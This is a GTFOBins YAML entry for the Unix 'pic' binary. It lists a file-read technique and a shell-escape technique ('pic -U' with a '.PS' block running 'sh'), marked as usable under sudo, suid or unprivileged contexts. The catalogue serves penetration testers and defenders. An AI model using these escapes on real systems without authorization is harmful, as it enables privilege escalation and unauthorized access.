<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/pic -->
---
functions:
  file-read:
  - binary: false
    code: |-
      pic /path/to/input-file
    comment: |-
      The output is prefixed with some content.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      pic -U
      .PS
      sh X sh X
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
